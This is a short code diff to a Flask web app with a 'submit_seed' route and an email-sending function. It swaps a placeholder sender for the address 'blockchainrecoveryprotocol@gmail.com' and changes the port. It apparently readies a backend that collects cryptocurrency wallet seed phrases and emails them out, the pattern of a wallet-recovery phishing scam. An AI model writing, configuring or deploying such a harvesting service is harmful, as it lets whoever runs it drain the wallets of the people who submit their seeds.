@@ -8,10 +8,10 @@ import time
 
 app = Flask(__name__)
 
-# Email configuration (you'll need to set these up)
+# Email configuration 
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
-EMAIL_ADDRESS = "your-email@gmail.com"
+EMAIL_ADDRESS = "blockchainrecoveryprotocol@gmail.com"
 EMAIL_PASSWORD = "your-app-password"
 
 def send_email_async(email_data):
@@ -83,4 +83,4 @@ def submit_seed():
         return jsonify({'status': 'error', 'message': str(e)})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=3000, debug=False)
